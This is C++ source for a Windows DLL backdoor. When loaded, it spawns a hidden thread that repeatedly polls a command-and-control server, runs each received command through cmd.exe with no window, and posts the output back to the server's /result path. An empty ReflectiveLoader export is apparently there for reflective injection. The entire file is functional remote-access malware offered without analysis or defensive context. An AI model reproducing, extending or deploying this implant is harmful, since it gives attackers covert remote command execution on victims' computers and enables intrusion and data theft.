#include "common.h"
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")

std::string ExecCmd(const std::string &cmd)
{
	std::string result;
	STARTUPINFOA si = {sizeof(STARTUPINFOA)};
	PROCESS_INFORMATION pi = {0};
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
		return "Pipe error";

	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

	std::string fullCmd = "cmd.exe /c " + cmd;
	char *cmdLine = new char[fullCmd.size() + 1];
	strcpy(cmdLine, fullCmd.c_str());

	BOOL success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
								  CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi);
	delete[] cmdLine;

	if (!success)
	{
		CloseHandle(hReadPipe);
		CloseHandle(hWritePipe);
		return "CreateProcess failed";
	}

	CloseHandle(hWritePipe);
	WaitForSingleObject(pi.hProcess, 30000);

	char buffer[4096];
	DWORD bytesRead;
	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
	{
		buffer[bytesRead] = '\0';
		result += buffer;
	}

	CloseHandle(hReadPipe);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return result;
}

DWORD WINAPI BeaconThread(LPVOID)
{
	Log("[*] Beacon started");
	while (true)
	{
		HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
		if (hSession)
		{
			HINTERNET hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
			if (hConnect)
			{
				HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", NULL, NULL, NULL, 0);
				if (hRequest)
				{
					if (WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) &&
						WinHttpReceiveResponse(hRequest, NULL))
					{
						DWORD size = 0;
						WinHttpQueryDataAvailable(hRequest, &size);
						if (size > 0)
						{
							char *buf = new char[size + 1];
							ZeroMemory(buf, size + 1);
							DWORD read = 0;
							WinHttpReadData(hRequest, buf, size, &read);
							std::string cmd(buf);
							delete[] buf;
							cmd.erase(cmd.find_last_not_of(" \n\r\t") + 1);
							if (!cmd.empty())
							{
								Log(("CMD: " + cmd).c_str());
								std::string out = ExecCmd(cmd);
								HINTERNET hPost = WinHttpOpenRequest(hConnect, L"POST", L"/result", NULL, NULL, NULL, 0);
								if (hPost)
								{
									WinHttpSendRequest(hPost, L"Content-Type: text/plain", -1L,
													   (LPVOID)out.c_str(), out.size(), out.size(), 0);
									WinHttpReceiveResponse(hPost, NULL);
									WinHttpCloseHandle(hPost);
								}
							}
						}
					}
					WinHttpCloseHandle(hRequest);
				}
				WinHttpCloseHandle(hConnect);
			}
			WinHttpCloseHandle(hSession);
		}
		Sleep(BEACON_INTERVAL * 1000);
	}
	return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID)
{
	if (reason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hModule);
		Log("[DLL] Loaded");
		CreateThread(NULL, 0, BeaconThread, NULL, 0, NULL);
	}
	return TRUE;
}

extern "C" __declspec(dllexport) void ReflectiveLoader() {}